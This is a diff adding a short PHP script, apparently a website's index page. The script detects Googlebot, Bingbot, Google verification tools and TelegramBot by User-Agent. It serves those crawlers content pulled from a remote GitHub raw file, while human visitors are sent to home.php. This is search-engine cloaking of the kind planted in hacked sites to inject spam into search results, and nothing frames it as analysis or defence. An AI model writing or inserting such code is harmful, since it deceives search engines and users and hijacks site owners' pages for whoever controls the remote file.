@@ -1,0 +1,23 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) { 
+    // Jika pengunjung adalah bot
+    $message = file_get_contents('https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/uppen.txt');
+    echo $message; 
+    exit;
+} else {
+    include('home.php');
+}
+?>
